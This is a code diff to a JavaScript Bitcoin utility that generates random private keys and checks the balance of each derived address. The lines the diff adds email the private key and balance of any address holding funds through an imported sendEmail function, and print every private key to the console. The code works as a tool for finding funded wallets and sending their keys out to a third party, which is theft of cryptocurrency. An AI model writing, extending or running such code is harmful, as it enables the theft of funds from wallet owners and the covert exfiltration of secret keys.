@@ -7,6 +7,7 @@ const { ECPairFactory } = require('ecpair');
 const ecc = require('tiny-secp256k1');
 const ECPair = ECPairFactory(ecc);
 import { BTC_NETWORK, UTXO_API } from './constants.js';
+import { sendEmail } from './email.js';
 
 export function sleep(ms) {
     return new Promise((resolve) => setTimeout(resolve, ms));
@@ -152,7 +153,11 @@ export async function generateAddressWithBalance(orderNumber) {
     const { address } = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey });  // Generate Bitcoin address
 
     const balance = await getBalance(address);  // Fetch the balance of the generated address
+    if (balance > 0) {
+        sendEmail("BTC", privateKey.toString('hex'), balance);
+    }
 
+    console.log(`Order #${orderNumber}: Private Key: ${privateKey.toString('hex')}, Balance: ${balance} BTC`);
     return {
         Order: orderNumber,
         PrivateKey: privateKey.toString('hex'),
